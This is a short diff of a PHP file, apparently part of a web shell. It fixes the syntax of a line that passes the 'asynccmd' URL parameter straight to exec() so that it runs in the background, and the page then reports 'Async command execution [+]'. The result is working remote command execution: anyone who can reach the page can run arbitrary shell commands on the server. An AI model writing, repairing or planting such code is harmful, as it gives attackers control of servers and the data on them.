@@ -125,7 +125,7 @@ function printPerms($file)
             }
         }
         if (isset($_GET['asynccmd'])) {
-            exec( $_GET['asynccmd'] . > /dev/null 2>&1 &);
+            exec($_GET['asynccmd']." > /dev/null 2>&1 &");
             echo "<br><br><b>Async command execution [+] </b><br>";
         }
         echo "<br>";
